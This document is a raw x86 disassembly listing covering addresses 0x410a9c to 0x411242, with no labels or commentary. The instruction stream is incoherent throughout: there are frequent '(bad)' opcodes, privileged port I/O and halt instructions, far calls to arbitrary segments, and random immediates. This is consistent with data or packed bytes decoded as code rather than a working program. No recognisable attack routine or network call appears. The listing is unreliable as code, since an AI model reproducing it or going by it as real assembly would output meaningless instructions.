  410a9c:	pop    esp
  410a9d:	loope  0x410a3f
  410a9f:	xor    eax,0xc088dc28
  410aa4:	call   0x9480:0x9ea8cb26
  410aab:	fimul  WORD PTR [ebp-0x5f459800]
  410ab1:	imul   esp,ebx,0x965399aa
  410ab7:	push   0xffffffff
  410ab9:	dec    ebx
  410aba:	adc    eax,ebx
  410abc:	sbb    eax,0x6fd0864f
  410ac1:	mov    dh,0x1d
  410ac3:	xor    al,0xcd
  410ac5:	out    0x8,eax
  410ac7:	mov    dl,0x35
  410ac9:	imul   edi,DWORD PTR [edi+0x64],0x55
  410acd:	inc    ebp
  410ace:	scas   eax,DWORD PTR es:[edi]
  410acf:	std    
  410ad0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ad1:	mov    ds:0xbb73a345,al
  410ad6:	mov    eax,0xd6e14b86
  410adb:	dec    ebx
  410adc:	mov    ah,0xe6
  410ade:	outs   dx,DWORD PTR ds:[esi]
  410adf:	stc    
  410ae0:	ficomp WORD PTR [ecx-0x55]
  410ae3:	push   es
  410ae4:	add    eax,0x81a1523b
  410ae9:	sub    DWORD PTR [esi-0x1f],ecx
  410aec:	cmp    bh,BYTE PTR [edi+0x7c]
  410aef:	add    BYTE PTR [edi-0x7321fa04],ah
  410af5:	push   esp
  410af6:	inc    esp
  410af7:	mov    ecx,0x244365aa
  410afc:	or     eax,0x23
  410aff:	repnz hlt 
  410b01:	inc    esi
  410b02:	ror    BYTE PTR [esi+0xe],1
  410b05:	adc    BYTE PTR [esi],0x6c
  410b08:	push   edi
  410b09:	repz repz cmc 
  410b0c:	int3   
  410b0d:	jb     0x410b88
  410b0f:	add    eax,DWORD PTR [ebp+0x1bc334de]
  410b15:	ins    BYTE PTR es:[edi],dx
  410b16:	gs inc ebp
  410b18:	shr    bh,0x7b
  410b1b:	sbb    eax,0xfde4fa08
  410b20:	mov    dh,0x89
  410b22:	retf   0xcf78
  410b25:	aaa    
  410b26:	or     dl,BYTE PTR [eax+0x582d29de]
  410b2c:	div    BYTE PTR [ecx]
  410b2e:	mov    cl,0xba
  410b30:	add    al,0x87
  410b32:	fs push edi
  410b34:	pop    ebx
  410b35:	sbb    eax,0x3679839d
  410b3a:	ud1    ebp,DWORD PTR ds:0x5e235942
  410b41:	mov    ds:0x1dafbd4,al
  410b46:	jne    0x410bc1
  410b48:	jmp    0xadf4330c
  410b4d:	(bad)  
  410b4e:	gs and eax,0xfd92ca7c
  410b54:	cmp    DWORD PTR [ecx+0x53ff4404],eax
  410b5a:	aad    0x54
  410b5c:	aad    0x45
  410b5e:	dec    eax
  410b5f:	dec    ebp
  410b60:	fidivr WORD PTR [esi]
  410b62:	je     0x410b80
  410b64:	and    al,0x7d
  410b66:	clc    
  410b67:	lahf   
  410b68:	push   ss
  410b69:	sbb    DWORD PTR [edx+0x21],ebx
  410b6c:	daa    
  410b6d:	cmc    
  410b6e:	pop    eax
  410b6f:	jns    0x410b88
  410b71:	jnp    0x410b19
  410b73:	sub    al,BYTE PTR [ecx+0xc93391e]
  410b79:	cld    
  410b7a:	jle    0x410b02
  410b7c:	rcl    bh,cl
  410b7e:	push   ds
  410b7f:	test   eax,0xcd052974
  410b84:	xor    dl,BYTE PTR [edx-0x62ff5115]
  410b8a:	mov    ch,BYTE PTR [eax]
  410b8c:	stos   BYTE PTR es:[edi],al
  410b8d:	mov    ds:0x7ab7dc4d,al
  410b92:	mov    ch,0xd8
  410b94:	lods   eax,DWORD PTR ds:[esi]
  410b95:	xchg   edi,eax
  410b96:	and    eax,0xa7f39020
  410b9b:	pusha  
  410b9c:	pop    eax
  410b9d:	push   ds
  410b9e:	pop    ebx
  410b9f:	aas    
  410ba0:	jg     0x410c17
  410ba2:	ret    
  410ba3:	es jge 0x410bfe
  410ba6:	or     BYTE PTR [eax+0x7d],0x1c
  410baa:	aad    0x39
  410bac:	inc    edi
  410bad:	out    0x65,eax
  410baf:	and    dh,0x0
  410bb2:	push   edx
  410bb3:	add    eax,0x3410b53b
  410bb8:	aad    0x93
  410bba:	cmp    dl,bl
  410bbc:	data16 stos BYTE PTR es:[edi],al
  410bbe:	dec    edx
  410bbf:	push   es
  410bc0:	dec    edx
  410bc1:	int3   
  410bc2:	nop
  410bc3:	xor    BYTE PTR [edi+ebx*8],cl
  410bc6:	jmp    0xd0f1:0x9b991afe
  410bcd:	call   0xa6db:0x6bd253a3
  410bd4:	scas   eax,DWORD PTR es:[edi]
  410bd5:	mov    ch,0xb1
  410bd7:	les    eax,FWORD PTR [ebp+0x2c3b45e3]
  410bdd:	loope  0x410c28
  410bdf:	fdivr  st(6),st
  410be1:	jle    0x410c2e
  410be3:	pop    ds
  410be4:	arpl   WORD PTR [eax+0x1a],si
  410be7:	arpl   si,ax
  410be9:	clc    
  410bea:	push   ebx
  410beb:	lods   eax,DWORD PTR ds:[esi]
  410bec:	pop    ss
  410bed:	adc    DWORD PTR [esi],esp
  410bef:	loopne 0x410bd1
  410bf1:	or     DWORD PTR [ebp-0x53],esp
  410bf4:	inc    esp
  410bf5:	(bad)  
  410bf6:	dec    esi
  410bf7:	push   0x65b0e7e1
  410bfc:	push   ebx
  410bfd:	ret    
  410bfe:	fbstp  TBYTE PTR [edx+0x58]
  410c01:	mov    esi,0xcfb2df4b
  410c06:	pop    edi
  410c07:	mov    cl,0xcf
  410c09:	ins    BYTE PTR es:[edi],dx
  410c0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c0b:	cmp    DWORD PTR [edi],esi
  410c0d:	adc    BYTE PTR [esi+0x4e],al
  410c10:	outs   dx,DWORD PTR ds:[esi]
  410c11:	xchg   ebp,eax
  410c12:	add    ch,BYTE PTR [ebp+0x61]
  410c15:	adc    eax,0x26644741
  410c1a:	aam    0x5c
  410c1c:	imul   edx,DWORD PTR [ecx+0x3c31b802],0x354c3287
  410c26:	repz jb 0x410c53
  410c29:	dec    edx
  410c2a:	xchg   ecx,eax
  410c2b:	mov    al,0x3d
  410c2d:	dec    ebp
  410c2e:	cs jne 0x410c94
  410c31:	jb     0x410bc7
  410c33:	xchg   DWORD PTR [edx+0x6fc355d7],esp
  410c39:	and    DWORD PTR [edi+ecx*1],0xc928796d
  410c40:	adc    al,0x98
  410c42:	ss mov ch,0xf0
  410c45:	adc    ecx,DWORD PTR [ebx+0x19]
  410c48:	ins    DWORD PTR es:[edi],dx
  410c49:	lahf   
  410c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c4b:	(bad)  
  410c4c:	adc    BYTE PTR [ebx+0xe5937ef],cl
  410c52:	mov    esp,0x79ccf86f
  410c57:	xchg   bl,dh
  410c59:	iret   
  410c5a:	arpl   WORD PTR [ebx-0x7c],sp
  410c5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c5e:	popf   
  410c5f:	fisub  WORD PTR [ecx+0x6e2e9185]
  410c65:	pop    esp
  410c66:	imul   edx,DWORD PTR [edi+0xd],0xeb8aa023
  410c6d:	adc    DWORD PTR [esi],0x66
  410c70:	push   ss
  410c71:	in     al,0x18
  410c73:	rol    BYTE PTR [ecx+0x4220706],0xe1
  410c7a:	xchg   esp,eax
  410c7b:	sbb    edi,esi
  410c7d:	ficom  DWORD PTR [edx]
  410c7f:	cmp    DWORD PTR [eax],edi
  410c81:	push   es
  410c82:	sahf   
  410c83:	std    
  410c84:	push   0x10
  410c86:	popf   
  410c87:	jge    0x410c66
  410c89:	mov    eax,0x5a3397c6
  410c8e:	sub    BYTE PTR [eax+0x15],cl
  410c91:	daa    
  410c92:	mov    BYTE PTR [eax],ch
  410c94:	inc    edi
  410c95:	push   ss
  410c96:	dec    ebp
  410c97:	jno    0x410d06
  410c99:	push   cs
  410c9a:	sub    al,0x4b
  410c9c:	or     eax,0x307c9909
  410ca1:	out    dx,al
  410ca2:	inc    ecx
  410ca3:	dec    esi
  410ca4:	add    dh,BYTE PTR [edi+ebx*8-0x65]
  410ca8:	xor    al,0xfc
  410caa:	das    
  410cab:	je     0x410c9c
  410cad:	je     0x410cd8
  410caf:	adc    BYTE PTR [ecx+0x66dcce59],bh
  410cb5:	pop    ds
  410cb6:	dec    ebx
  410cb7:	daa    
  410cb8:	ins    DWORD PTR es:[edi],dx
  410cb9:	push   edx
  410cba:	into   
  410cbb:	ret    0x27dc
  410cbe:	push   0xf2a50fcd
  410cc3:	lea    eax,[esi*8+0x6da9aa4b]
  410cca:	pushf  
  410ccb:	xchg   esp,eax
  410ccc:	(bad)  
  410ccd:	jmp    DWORD PTR [ecx+ebp*1]
  410cd0:	fldenv [edi+0x37]
  410cd3:	adc    eax,0x8fddeb52
  410cd8:	add    eax,0x206e035d
  410cdd:	push   ss
  410cde:	push   es
  410cdf:	push   edx
  410ce0:	xchg   BYTE PTR [esi-0x5f],bl
  410ce3:	and    ebx,DWORD PTR [ebx+0x652a51ee]
  410ce9:	imul   eax,DWORD PTR [ecx],0x74
  410cec:	in     al,0x10
  410cee:	and    al,0x7b
  410cf0:	dec    ebp
  410cf1:	or     BYTE PTR [ecx-0x2d],ch
  410cf4:	sub    BYTE PTR [ecx+0x1c],0xfd
  410cf8:	cmc    
  410cf9:	and    eax,0xab13c4c
  410cfe:	pop    esi
  410cff:	xchg   edi,eax
  410d00:	xchg   ebp,eax
  410d01:	adc    cl,BYTE PTR [ebx]
  410d03:	add    BYTE PTR ds:0x3e2f3af2,al
  410d09:	jl     0x410d4e
  410d0b:	jge    0x410d29
  410d0d:	cmc    
  410d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d10:	iret   
  410d11:	jno    0x410d51
  410d13:	addr16 add al,0x8b
  410d16:	add    al,0x80
  410d18:	mov    ebp,0x220dcc
  410d1d:	mov    eax,0x8e3da951
  410d22:	(bad)  
  410d23:	(bad)  
  410d24:	fstp   TBYTE PTR [ebx+0x4d]
  410d27:	icebp  
  410d28:	pop    esi
  410d29:	(bad)  
  410d2a:	setae  BYTE PTR [edx-0x4626f5a5]
  410d31:	mov    WORD PTR [ebp-0x45],gs
  410d34:	pop    ebp
  410d35:	ins    DWORD PTR es:[edi],dx
  410d36:	std    
  410d37:	mov    ds:0x77775971,al
  410d3c:	lods   eax,DWORD PTR ds:[esi]
  410d3d:	inc    edx
  410d3e:	mov    ebx,0x2524be12
  410d43:	sub    eax,0xde07b497
  410d48:	fdivr  DWORD PTR [ebp-0x45]
  410d4b:	adc    bl,bl
  410d4d:	or     al,0xf6
  410d4f:	inc    ecx
  410d50:	es mov al,0xb2
  410d53:	xor    BYTE PTR [edi-0xe469877],al
  410d59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d5a:	add    BYTE PTR [eax+0x38ec2f51],ah
  410d60:	push   0x5b
  410d62:	jmp    0x5fb6:0xc009e72
  410d69:	cmp    dh,bl
  410d6b:	ds fwait
  410d6d:	cmp    ah,BYTE PTR [ecx]
  410d6f:	popa   
  410d70:	mov    ebp,0x1a0ecd25
  410d75:	sub    al,cl
  410d77:	dec    edi
  410d78:	retf   0x546e
  410d7b:	mov    ebx,0x29964b28
  410d80:	pop    ecx
  410d81:	jo     0x410dbd
  410d83:	inc    edx
  410d84:	stos   DWORD PTR es:[edi],eax
  410d85:	repz jmp 0x410dd9
  410d88:	outs   dx,BYTE PTR fs:[esi]
  410d8a:	data16 xchg BYTE PTR [eax+0x12],dh
  410d8e:	cld    
  410d8f:	fucom  st(6)
  410d91:	mov    esi,0x57c6fc67
  410d96:	(bad)  
  410d97:	in     eax,dx
  410d98:	outs   dx,BYTE PTR ds:[esi]
  410d99:	inc    edx
  410d9a:	and    DWORD PTR [edx],eax
  410d9c:	jmp    0x410d47
  410d9e:	psubsb mm4,QWORD PTR [ebp+0x43]
  410da2:	pop    ds
  410da3:	mov    edx,0xd046c321
  410da8:	inc    ebx
  410da9:	mov    ebx,0x8ea9d082
  410dae:	dec    esp
  410daf:	lahf   
  410db0:	xchg   ebx,eax
  410db1:	adc    al,0x9b
  410db3:	shr    DWORD PTR [eax+0x6d],cl
  410db6:	(bad)  
  410db8:	mov    ecx,DWORD PTR [esi]
  410dba:	pop    esi
  410dbb:	push   edi
  410dbc:	ins    BYTE PTR es:[edi],dx
  410dbd:	dec    esi
  410dbe:	sahf   
  410dbf:	jne    0x410db1
  410dc1:	mov    ah,0x69
  410dc3:	xchg   ecx,eax
  410dc4:	mov    dh,0x1
  410dc6:	sbb    DWORD PTR [ebx*8-0x502547ca],esp
  410dcd:	std    
  410dce:	retf   
  410dcf:	and    bl,BYTE PTR [eax+0x2f]
  410dd2:	scas   al,BYTE PTR es:[edi]
  410dd3:	xlat   BYTE PTR ds:[ebx]
  410dd4:	(bad)  
  410dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dd6:	aaa    
  410dd7:	enter  0x5279,0x16
  410ddb:	push   ss
  410ddc:	mov    esi,0xc9155370
  410de1:	dec    edi
  410de2:	test   BYTE PTR [edi+ecx*2],0xeb
  410de6:	fdivr  QWORD PTR [esp+esi*4+0x54]
  410dea:	es mov esp,cs
  410ded:	lahf   
  410dee:	fist   WORD PTR [ecx+0x27]
  410df1:	adc    ebx,DWORD PTR [esi-0x6c]
  410df4:	sbb    al,BYTE PTR [ebp+0x175deb18]
  410dfa:	popf   
  410dfb:	out    dx,al
  410dfc:	inc    ebp
  410dfd:	je     0x410e52
  410dff:	popf   
  410e00:	ja     0x410dc8
  410e02:	fisub  DWORD PTR [edi]
  410e04:	fwait
  410e05:	mov    bh,0x13
  410e07:	test   eax,0x31f119eb
  410e0c:	fs out 0xc,eax
  410e0f:	stos   DWORD PTR es:[edi],eax
  410e10:	mov    esp,0xbdbea4d3
  410e15:	cmp    ebx,DWORD PTR [edx-0x26b7a0c8]
  410e1b:	stos   DWORD PTR es:[edi],eax
  410e1c:	call   0x7f22:0x63d935b2
  410e23:	sub    ah,cl
  410e25:	adc    DWORD PTR [edi],edi
  410e27:	dec    esi
  410e28:	adc    eax,0xcd4737a6
  410e2d:	and    BYTE PTR [ecx-0x4236f0a2],ch
  410e33:	fist   WORD PTR [ebx]
  410e35:	push   cs
  410e36:	fdiv   QWORD PTR [ecx]
  410e38:	push   edx
  410e39:	pushf  
  410e3a:	jb     0x410e05
  410e3c:	jo     0x410e9a
  410e3e:	dec    esp
  410e3f:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e41:	(bad)  
  410e42:	cmp    BYTE PTR ds:0xfbe27f1e,ah
  410e48:	pop    eax
  410e49:	out    dx,eax
  410e4a:	(bad)  
  410e4b:	in     al,dx
  410e4c:	outs   dx,DWORD PTR ds:[esi]
  410e4d:	ror    dl,0x22
  410e50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e51:	std    
  410e52:	mov    edx,edx
  410e54:	test   BYTE PTR [eax+0x2b406566],0xb0
  410e5b:	jmp    0xd6ef30d4
  410e60:	cwde   
  410e61:	enter  0x18fd,0xb1
  410e65:	neg    dh
  410e67:	sub    al,0xd8
  410e69:	inc    edi
  410e6a:	(bad)  
  410e6b:	(bad)  [esi]
  410e6d:	and    eax,0x8c4a3405
  410e72:	bound  eax,QWORD PTR [edi-0x12]
  410e75:	pusha  
  410e76:	mov    edx,0xdb9b3d0b
  410e7b:	js     0x410e8d
  410e7d:	clc    
  410e7e:	push   ss
  410e7f:	mov    ds:0xd3c6bd2c,eax
  410e84:	mov    eax,ds:0x40f5768d
  410e89:	cmp    dh,BYTE PTR [edi]
  410e8b:	or     dl,ch
  410e8d:	jp     0x410ed8
  410e8f:	xchg   esp,eax
  410e90:	xor    al,0xc1
  410e92:	clc    
  410e93:	pop    eax
  410e94:	and    eax,0x12d0c404
  410e99:	into   
  410e9a:	out    dx,eax
  410e9b:	data16 cmp dh,ah
  410e9e:	xchg   ecx,eax
  410e9f:	cmc    
  410ea0:	mov    dl,0x66
  410ea2:	sub    al,0xb4
  410ea4:	fistp  WORD PTR [edx*4+0x57e9752a]
  410eab:	xor    edi,DWORD PTR [ecx]
  410ead:	add    esp,DWORD PTR ds:[esi]
  410eb0:	pop    esp
  410eb1:	mov    ecx,0x92cfbe11
  410eb6:	and    ah,BYTE PTR [eax+ecx*2+0xefcb202]
  410ebd:	and    BYTE PTR [esi-0x51],bl
  410ec0:	leave  
  410ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ec2:	pop    esi
  410ec3:	dec    esi
  410ec4:	pop    ebx
  410ec5:	in     eax,0x20
  410ec7:	out    0x71,eax
  410ec9:	test   DWORD PTR [eax-0x6d8a752],eax
  410ecf:	push   eax
  410ed0:	addr16 pushf 
  410ed2:	imul   esp,DWORD PTR [esi-0x5d],0xffffffec
  410ed6:	and    BYTE PTR [edi+0x55],dl
  410ed9:	inc    DWORD PTR [ebp+0x5da74199]
  410edf:	lock push ds
  410ee1:	in     al,0x5d
  410ee3:	or     eax,DWORD PTR [ebx]
  410ee5:	scas   al,BYTE PTR es:[edi]
  410ee6:	push   es
  410ee7:	call   0x1b3c6c99
  410eec:	pop    esi
  410eed:	xor    BYTE PTR [ebx-0x44],al
  410ef0:	sub    ah,bl
  410ef2:	pop    es
  410ef3:	sbb    al,0x12
  410ef5:	repz (bad) 
  410ef7:	jbe    0x410ee7
  410ef9:	shl    ecx,0x91
  410efc:	mov    ds:0x6d889aa7,al
  410f01:	add    al,BYTE PTR [edx+ecx*4-0xba3dc3d]
  410f08:	sbb    al,0x6f
  410f0a:	lods   eax,DWORD PTR ds:[esi]
  410f0b:	inc    edx
  410f0c:	add    al,0x95
  410f0e:	leave  
  410f0f:	sbb    eax,0xb1e16022
  410f14:	push   esi
  410f15:	sbb    al,0x79
  410f17:	inc    ecx
  410f18:	mov    eax,ds:0x89db9b08
  410f1d:	lgs    ebx,FWORD PTR [ecx]
  410f20:	fmul   QWORD PTR [ebx-0x7c]
  410f23:	inc    esi
  410f24:	sti    
  410f25:	out    dx,eax
  410f26:	cmp    al,0xed
  410f28:	sbb    edx,esp
  410f2a:	mov    esp,0x1e9f6bdb
  410f2f:	dec    ebp
  410f30:	inc    edx
  410f31:	imul   BYTE PTR [ebp+0x18f733cb]
  410f37:	xchg   DWORD PTR [ebp-0x6c0a9e0c],esi
  410f3d:	cmp    al,0xc6
  410f3f:	push   edi
  410f40:	sub    esi,DWORD PTR [ebx]
  410f42:	add    eax,0x6b735841
  410f47:	and    eax,0x8882fa0e
  410f4c:	adc    al,0xe1
  410f4e:	lods   eax,DWORD PTR ds:[esi]
  410f4f:	cdq    
  410f50:	(bad)  
  410f51:	sub    BYTE PTR [esi+0x7c],al
  410f54:	pop    ebp
  410f55:	out    0xe6,al
  410f57:	ins    BYTE PTR es:[edi],dx
  410f58:	scas   al,BYTE PTR es:[edi]
  410f59:	xchg   BYTE PTR [ebx+0x29fd06c5],dl
  410f5f:	xchg   edx,eax
  410f60:	shr    BYTE PTR [eax+0x21],cl
  410f63:	jle    0x410f18
  410f65:	sub    al,0xbc
  410f67:	push   esp
  410f68:	jns    0x410fce
  410f6a:	mov    dl,0xb
  410f6c:	inc    esp
  410f6d:	lods   eax,DWORD PTR ds:[esi]
  410f6e:	mov    al,ds:0x63262a3b
  410f73:	aam    0x38
  410f75:	sub    dl,0xd5
  410f78:	loop   0x410f54
  410f7a:	ror    dl,1
  410f7c:	sub    edx,DWORD PTR [edi+eax*4]
  410f7f:	data16 repz or BYTE PTR [edi],ah
  410f83:	jns    0x410f5e
  410f85:	(bad)  [eax]
  410f87:	pop    esp
  410f88:	push   es
  410f89:	cld    
  410f8a:	pop    ecx
  410f8b:	xor    al,0x24
  410f8d:	(bad)  [ebx-0x6aad939d]
  410f93:	mov    DWORD PTR [edi-0x5],ecx
  410f96:	pop    es
  410f97:	call   0x336bab53
  410f9c:	xchg   ebp,eax
  410f9d:	cdq    
  410f9e:	push   ecx
  410f9f:	pop    ss
  410fa0:	mov    edi,0xb12dcb28
  410fa5:	sub    eax,0xd179d7f8
  410faa:	pop    ds
  410fab:	cmc    
  410fac:	dec    eax
  410fad:	aaa    
  410fae:	fbld   TBYTE PTR [edi+0x1c]
  410fb1:	js     0x411024
  410fb3:	dec    edx
  410fb4:	and    ecx,DWORD PTR [edi-0x665768b0]
  410fba:	sar    BYTE PTR [esi-0x4c34075f],cl
  410fc0:	push   esp
  410fc1:	and    DWORD PTR [edi+0xb],ebp
  410fc4:	pop    ecx
  410fc5:	pop    ebx
  410fc6:	shr    DWORD PTR ds:0x31966b6d,0xa2
  410fcd:	imul   ebx,DWORD PTR [edx],0xffffffaa
  410fd0:	aas    
  410fd1:	enter  0xc219,0x75
  410fd5:	or     al,0x6d
  410fd7:	adc    DWORD PTR [edx],edx
  410fd9:	and    cl,BYTE PTR [ebx]
  410fdb:	dec    ebp
  410fdc:	xchg   esi,eax
  410fdd:	mov    al,0xc0
  410fdf:	popa   
  410fe0:	xor    esp,eax
  410fe2:	in     al,0x78
  410fe4:	loope  0x411013
  410fe6:	lds    edx,FWORD PTR [edi+edi*4]
  410fe9:	or     ah,BYTE PTR [ebx]
  410feb:	mov    edi,0xa39d049f
  410ff0:	enter  0x3482,0xa8
  410ff4:	push   ebp
  410ff5:	imul   esi,DWORD PTR [edx],0xb472c46d
  410ffb:	in     eax,dx
  410ffc:	rol    BYTE PTR [ecx-0x26],cl
  410fff:	test   BYTE PTR [eax+edx*2],dh
  411002:	mov    dl,0x41
  411004:	imul   esi,DWORD PTR ds:0x91993089,0x2b3a33e0
  41100e:	mov    ebx,0x2c5bcf17
  411013:	pop    esp
  411014:	daa    
  411015:	cmp    DWORD PTR [esi+0x256a0ef2],ebp
  41101b:	xchg   esp,eax
  41101c:	fucom  st(6)
  41101e:	jo     0x41100a
  411020:	lock es ret 0x7df
  411025:	sbb    ah,BYTE PTR [ecx+0x86b9f1f]
  41102b:	mov    edi,0xf37b4aa2
  411030:	jmp    0x5be25d66
  411035:	sub    edx,DWORD PTR [eax+ebx*1-0x47f65993]
  41103c:	dec    ebx
  41103d:	in     eax,dx
  41103e:	jo     0x411078
  411040:	gs sar ah,1
  411043:	arpl   WORD PTR [ebx],dx
  411045:	adc    DWORD PTR [edx],ebp
  411047:	daa    
  411048:	test   cl,0xac
  41104b:	nop
  41104c:	pop    ds
  41104d:	das    
  41104e:	fbld   TBYTE PTR fs:[ebp+0x3d5ba9f]
  411055:	mov    esi,0xd2ead1b9
  41105a:	xchg   ebx,eax
  41105b:	mov    BYTE PTR [eax],cl
  41105d:	dec    esp
  41105e:	pop    esp
  41105f:	mov    dh,0xce
  411061:	fs dec esi
  411063:	pop    edx
  411064:	mov    dl,0x70
  411066:	xor    eax,0x5f7bd8c7
  41106b:	inc    eax
  41106c:	cmp    eax,0x949f19e3
  411071:	adc    al,0x5e
  411073:	xchg   edx,eax
  411074:	xchg   esi,eax
  411075:	xchg   esp,eax
  411076:	mov    bl,0x57
  411078:	xchg   edi,eax
  411079:	jle    0x41101c
  41107b:	repz call 0xf60c382c
  411081:	adc    DWORD PTR [eax+0x12a0c1eb],esp
  411087:	push   eax
  411088:	jno    0x4110b5
  41108a:	fist   DWORD PTR [edx+0x57559286]
  411090:	xor    ah,ah
  411092:	shl    ch,0x1
  411095:	lock gs sub al,0x3b
  411099:	retf   
  41109a:	sbb    eax,0x44476d
  41109f:	push   esi
  4110a0:	stos   BYTE PTR es:[edi],al
  4110a1:	lods   al,BYTE PTR ds:[esi]
  4110a2:	mov    ch,ch
  4110a4:	push   ebx
  4110a5:	mov    DWORD PTR [edi],edx
  4110a7:	out    0x20,eax
  4110a9:	sub    dh,dl
  4110ab:	loope  0x411064
  4110ad:	push   0xffffffc8
  4110af:	ss pop ebx
  4110b1:	aam    0xd4
  4110b3:	inc    esp
  4110b4:	call   0x7f6d:0x6c7fd43
  4110bb:	cs cmp eax,0x5aff9cd9
  4110c1:	xchg   ebp,eax
  4110c2:	sub    dh,al
  4110c4:	cmp    edi,edx
  4110c6:	inc    esi
  4110c7:	pop    edi
  4110c8:	or     eax,0xc9eb184e
  4110cd:	inc    ebp
  4110ce:	mov    eax,ds:0x5428f505
  4110d3:	xor    esi,esi
  4110d5:	xchg   edx,eax
  4110d6:	out    0xfd,eax
  4110d8:	aaa    
  4110d9:	jle    0x4110b3
  4110db:	sbb    BYTE PTR ds:0xd19c1f52,0x19
  4110e2:	ret    
  4110e3:	sub    DWORD PTR [esi+0x52a39bc7],0x47
  4110ea:	and    BYTE PTR [edi-0x762400f4],0xb4
  4110f1:	call   0xbe9c:0xf0613b59
  4110f8:	ins    DWORD PTR es:[edi],dx
  4110f9:	mov    cl,0x28
  4110fb:	push   ss
  4110fc:	sub    eax,eax
  4110fe:	and    DWORD PTR [esi+0x79ce41da],0x59
  411105:	or     eax,DWORD PTR [edx-0x40c66782]
  41110b:	call   0x1400:0xc95e7e27
  411112:	jmp    0x411172
  411114:	mov    ds:0x55d8e5b6,eax
  411119:	add    DWORD PTR ds:0x82c3711,ebx
  41111f:	push   eax
  411120:	pop    eax
  411121:	adc    eax,0x8ccb3d9d
  411126:	pop    ss
  411127:	xchg   DWORD PTR [eax+edx*1],ebx
  41112a:	daa    
  41112b:	push   esi
  41112c:	test   al,0x68
  41112e:	push   edx
  41112f:	xchg   BYTE PTR [edx-0x44],cl
  411132:	test   al,0x9e
  411134:	das    
  411135:	test   DWORD PTR [eax],ecx
  411137:	js     0x4110fe
  411139:	jg     0x4110e7
  41113b:	and    dh,BYTE PTR [esi]
  41113d:	(bad)  
  41113e:	dec    esi
  41113f:	outs   dx,BYTE PTR ds:[esi]
  411140:	scas   eax,DWORD PTR es:[edi]
  411141:	fs jo  0x411113
  411144:	outs   dx,DWORD PTR ds:[esi]
  411145:	loope  0x41112b
  411147:	ins    DWORD PTR es:[edi],dx
  411148:	mov    ds:0x1750848d,al
  41114d:	clc    
  41114e:	and    dh,BYTE PTR [eax-0x5b96932a]
  411154:	cmp    eax,esp
  411156:	pop    es
  411157:	push   ecx
  411158:	add    BYTE PTR [eax-0x10d28763],bh
  41115e:	into   
  41115f:	enter  0x7029,0x6c
  411163:	out    dx,al
  411164:	in     eax,dx
  411165:	and    edi,DWORD PTR [ebp-0x6c]
  411168:	cmc    
  411169:	(bad)  
  41116a:	fld    DWORD PTR [edx-0x13caa7c1]
  411170:	repz test ch,0x38
  411174:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411175:	xchg   ebx,eax
  411176:	lock out dx,eax
  411178:	aas    
  411179:	aaa    
  41117a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41117b:	inc    eax
  41117c:	pop    edx
  41117d:	retf   0xfde7
  411180:	loopne 0x411199
  411182:	dec    eax
  411183:	retf   0xb1e0
  411186:	pop    esp
  411187:	(bad)  
  411188:	loope  0x411124
  41118a:	les    edx,FWORD PTR [ebp+0x2e02b19d]
  411190:	sti    
  411191:	mov    dl,0x9
  411193:	sahf   
  411194:	xchg   edx,eax
  411195:	test   DWORD PTR [ecx],esp
  411197:	sbb    al,0xb6
  411199:	xchg   BYTE PTR [ecx+0x57],ah
  41119c:	xor    esi,DWORD PTR [edx+0x3f9f2e9c]
  4111a2:	fst    st(5)
  4111a4:	sub    dl,BYTE PTR [ebp-0x2c]
  4111a7:	push   esp
  4111a8:	pop    eax
  4111a9:	and    BYTE PTR [ebx+eiz*4+0x32],0x4
  4111ae:	hlt    
  4111af:	scas   eax,DWORD PTR es:[edi]
  4111b0:	popa   
  4111b1:	pop    edx
  4111b2:	jge    0x411141
  4111b4:	mov    ah,0x22
  4111b6:	add    al,0xa7
  4111b8:	fdiv   st(5),st
  4111ba:	push   esi
  4111bb:	and    BYTE PTR [edx],bh
  4111bd:	push   cs
  4111be:	pop    edx
  4111bf:	jnp    0x4111cd
  4111c1:	cwde   
  4111c2:	dec    edx
  4111c3:	jecxz  0x41114f
  4111c5:	dec    ebx
  4111c6:	in     al,dx
  4111c7:	pop    eax
  4111c8:	cwde   
  4111c9:	popf   
  4111ca:	dec    edi
  4111cb:	gs std 
  4111cd:	mov    WORD PTR [eax+ecx*8],cs
  4111d0:	pop    eax
  4111d1:	jne    0x4111ff
  4111d3:	std    
  4111d4:	mov    esi,0x865f76da
  4111d9:	jmp    0x411175
  4111db:	div    BYTE PTR [edi-0x4c]
  4111de:	sbb    eax,0x1ce18708
  4111e3:	cmp    eax,DWORD PTR ss:[edx+0x7166752]
  4111ea:	pop    edi
  4111eb:	adc    edx,edi
  4111ed:	mov    dl,0x54
  4111ef:	mov    al,ds:0x950e9672
  4111f4:	stos   BYTE PTR es:[edi],al
  4111f5:	sbb    ebx,eax
  4111f7:	adc    BYTE PTR [edi],cl
  4111f9:	in     al,0x4c
  4111fb:	loop   0x41125f
  4111fd:	imul   esi,DWORD PTR [esi],0x22e389c4
  411203:	mov    edx,DWORD PTR [esp+eax*8-0x5585bd7a]
  41120a:	or     al,0xe1
  41120c:	icebp  
  41120d:	repnz and al,0x8a
  411210:	dec    esi
  411211:	and    eax,0x7a8bc6a3
  411216:	pop    ecx
  411217:	sub    DWORD PTR [ecx],0xffffff92
  41121a:	mov    ecx,0xf6972642
  41121f:	and    BYTE PTR [ebx+edi*8+0x725b10cf],ah
  411226:	mov    edi,0x7b591b27
  41122b:	mov    ds:0xd67e0307,al
  411230:	scas   al,BYTE PTR es:[edi]
  411231:	xchg   ebx,eax
  411232:	sbb    BYTE PTR [ebp+0x5e0708ac],0x2d
  411239:	push   ds
  41123a:	jo     0x411279
  41123c:	ds scas al,BYTE PTR es:[edi]
  41123e:	pop    edi
  41123f:	dec    edx
  411240:	fld    QWORD PTR [ebx]
  411242:	jne    0x4112a7
